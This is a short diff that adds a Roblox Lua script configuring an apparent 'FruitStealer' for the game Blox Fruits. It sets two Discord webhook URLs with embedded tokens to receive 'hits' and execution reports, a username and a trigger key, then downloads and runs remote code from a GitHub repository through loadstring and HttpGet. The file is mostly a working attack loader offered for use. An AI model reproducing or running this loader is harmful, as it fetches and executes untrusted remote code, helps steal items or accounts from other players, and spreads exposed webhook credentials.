@@ -1,0 +1,6 @@
+HitsWebhook = "https://discord.com/api/webhooks/1503692098183102564/cYLeE3RmisC7PZKIHxvcliMuVoe_3AnIKWVJZhndlXHL45sjwpxTNmtfCIi8NTAdpHOb"
+Executions_Webhook = "https://discord.com/api/webhooks/1503692098183102564/cYLeE3RmisC7PZKIHxvcliMuVoe_3AnIKWVJZhndlXHL45sjwpxTNmtfCIi8NTAdpHOb"
+Username = "AKOLISA_11"
+Button_Prompt = "E"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEVO/Bloxfruits-FruitStealer/refs/heads/main/lua"))()
